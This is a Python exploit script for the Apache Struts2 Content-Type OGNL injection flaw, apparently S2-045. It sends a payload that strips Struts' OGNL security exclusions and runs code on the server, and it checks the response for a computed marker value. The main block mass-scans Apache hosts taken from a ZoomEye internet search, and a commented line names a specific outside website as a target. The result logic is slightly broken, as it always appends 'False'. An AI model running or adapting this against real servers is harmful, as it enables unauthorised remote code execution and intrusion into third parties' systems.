#-*-coding:utf-8 -*-

"""
ApacheStruts2 
"""

import requests,sys,urllib,json
import zoomeye
import os

def _exploit(url):
	"""
	return info
	"""
	
	info = []
	
	payload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}"

	headers = {}

	headers["Content-Type"] = payload

	r = requests.get(url, headers=headers)

	if "105059592" in str(r.content):

		info.append('True')
 

	info.append('False')
	
	return info
	

def exploit(url):
	info = _exploit(url)
	return info

if __name__ == '__main__':

	url_list = zoomeye.search_data(app="Apache",file=False)
	count = 0
	for url in url_list:
		try:
			info = exploit(url)
			count += 1
			print(info)
		except Exception as e:
			print(e)
			continue
	
	
"""	
	url = 'http://enton-china.com'
	info = exploit(url)
	print(info)
	
"""